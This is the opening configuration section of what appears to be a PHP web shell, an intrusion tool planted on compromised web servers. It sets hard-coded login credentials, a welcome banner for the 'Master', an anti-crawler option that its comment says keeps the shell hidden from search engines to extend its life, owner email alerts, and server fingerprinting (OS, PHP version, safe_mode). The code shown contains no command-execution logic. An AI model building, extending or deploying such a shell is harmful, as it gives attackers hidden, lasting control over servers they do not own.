<?php
$greeting 		= "0x xx W3lc0m3 M4st3r xx x0";
$user 			= "lionaneesh";
$pass 			= "lionaneesh";
$lock 			= "on"; // set this to off if you dont need the login page
$antiCrawler 		= "off"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
$tracebackFeature 	= "off"; // set this feature to on to enable email alerts
$ownerEmail 		= "lionaneesh@gmail.com"; // Change this to your email , This email is used to deliver tracebacks about your shell
$url 			= (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$phpVersion		= phpversion();
$self			= $_SERVER["PHP_SELF"]; // Where am i
$sm 			= @ini_get('safe_mode');
$SEPARATOR 		= '/'; // Default Directory separator
$os 			= "N/D";

if(stristr(php_uname(),"Windows"))
{
        $SEPARATOR = '\\';
        $os = "Windows";
}
?>